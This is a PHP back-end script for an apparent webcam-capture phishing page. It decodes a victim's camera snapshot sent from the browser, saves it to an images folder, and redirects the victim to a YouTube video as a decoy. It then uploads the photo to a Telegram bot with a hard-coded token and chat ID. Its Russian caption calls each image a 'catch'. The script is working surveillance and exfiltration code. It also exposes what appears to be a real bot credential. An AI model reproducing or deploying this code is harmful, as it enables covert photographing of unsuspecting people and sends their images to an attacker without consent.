<?php
$botToken = "8749123902:AAGnWBYBrUj4pHcE2btDjtBqpMVKMFQB7yQ";
$chatId = "-1003463348834";
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    // Сохраняем в твою рабочую папку
    $fileName = 'images/cam' . $date . '.png';
    file_put_contents($fileName, $unencodedData);
header('Location: https://www.youtube.com/watch?v=37Z9D7vL8pY');
    
    // Дублируем в папку для счетчика меню
    $dbFile = 'images/cam' . $date . '.png';
    file_put_contents($dbFile, $unencodedData);
header('Location: https://www.youtube.com/watch?v=37Z9D7vL8pY');

    // Отправка в Telegram
    $url = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
    $post_fields = [
        'chat_id'   => $chatId,
        'photo'     => new CURLFile(realpath($fileName)),
        'caption'   => "📸 Улов сохранен в базу и отправлен вам!"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
